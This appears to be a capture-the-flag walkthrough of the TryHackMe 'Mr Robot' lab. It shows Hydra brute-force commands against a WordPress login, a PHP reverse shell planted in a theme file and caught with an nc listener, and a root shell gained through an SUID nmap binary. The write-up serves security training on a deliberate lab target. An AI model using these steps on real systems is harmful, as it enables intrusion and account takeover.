We start by scanning open ports with nmap :
```
nmap -p- 10.10.198.11
```
![Image Alt](https://github.com/kcoainnapo/tryhackme/blob/main/Mr%20Robot%20CTF/Images/nmap.png?raw=true)

We start by fuzzing the website for interesting directories :  

![Image Alt](https://github.com/kcoainnapo/tryhackme/blob/main/Mr%20Robot%20CTF/Images/fuzzz.png?raw=true)


Going to http://10.10.198.11/robots show 2 files :
- fsocity.dic
- key-1-of-3.txt

We can obtain them by going to :
http://10.10.198.11/fsocity.dic
http://10.10.198.11/key-1-of-3.txt

We have the first flag by going to http://10.10.198.11/key-1-of-3.txt

The file fsocity.dic is very long we can try to remove the duplicates and organize via alphabetical order by running 
```
cat fsocity.dic | sort | uniq > uniq-word.txt
```

After running the previous command the file pass from 858160 words to 11451 words

The login panel in http://10.10.198.11/wp-login.php show an error message that reveal if we provided an existing user.

![Image Alt](https://github.com/kcoainnapo/tryhackme/blob/main/Mr%20Robot%20CTF/Images/brute-login.png?raw=true)

So we can brute force the login panel with Hydra : 

Bruteforce username : 
```
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p password 10.10.198.11 http-post-form  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.198.11%2Fwp-admin%2F&testcookie=1:invalid username"
```
![Image Alt](https://github.com/kcoainnapo/tryhackme/blob/main/Mr%20Robot%20CTF/Images/user-enum.png?raw=true)


Bruteforce password
```
hydra -l elliot -P uniq-word.txt 10.10.198.11 http-post-form  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.198.11%2Fwp-admin%2F&testcookie=1:is incorrect"
```
![Image Alt](https://github.com/kcoainnapo/tryhackme/blob/main/Mr%20Robot%20CTF/Images/password-enum.png?raw=true)


Now we are connected to the admin dashboard but we want to have the possibility to upload a reverse shell to execute command.

So we go to Appearence > Editor :

![Image Alt](https://github.com/kcoainnapo/tryhackme/blob/main/Mr%20Robot%20CTF/Images/Editor.png?raw=true)


We then chose the file "footer.php" change the content to the php reverse shell in : https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php 

We updated the file to point to our IP, and then we start our listener :
```
nc -lvnp 1234
```
We navigate to http://10.10.198.11/wp-admin/footer.php to trigger our reverse shell 

Once we are in the syetem we go to /home/robot

We can't directly obtain the second key but we can open the file called "password.raw-md5"

The file contain the MD5 hash of the user 'robot'

We provide the hash to https://crackstation.net/ which luckily give us the corresponding password : abcdefghijklmnopqrstuvwxyz

![Image Alt](https://github.com/kcoainnapo/tryhackme/blob/main/Mr%20Robot%20CTF/Images/hash-decrypt.png?raw=true)


We can now switch to user robot but before that we need to upgrade our shell by running : 
```
python3 -c 'import pty;pty.spawn("/bin/bash");'
```
To switch to user robot we use
```
su robot 
```
We provide the password abcdefghijklmnopqrstuvwxyz

We can now obtain the second key : 

![Image Alt](https://github.com/kcoainnapo/tryhackme/blob/main/Mr%20Robot%20CTF/Images/switch-user-robot.png?raw=true)

We enumerate the files in the system to find privilege escalation vectors.

We ran the command :
```
find / -perm -04000 2>/dev/null
```
We see the interesting binary : 
```
/usr/local/bin/nmap
```
![Image Alt](https://github.com/kcoainnapo/tryhackme/blob/main/Mr%20Robot%20CTF/Images/suid-nmap.png?raw=true)

We check on https://gtfobins.github.io/gtfobins/nmap/

And see that we can spawn a shell using :
```
nmap --interactive
nmap> !sh
```
![Image Alt](https://github.com/kcoainnapo/tryhackme/blob/main/Mr%20Robot%20CTF/Images/nmap-root.png?raw=true)


We are root and can now obtain the third key:
```
cat /root/*
```
![Image Alt](https://github.com/kcoainnapo/tryhackme/blob/main/Mr%20Robot%20CTF/Images/last-flag.png?raw=true)


VOILA ! 


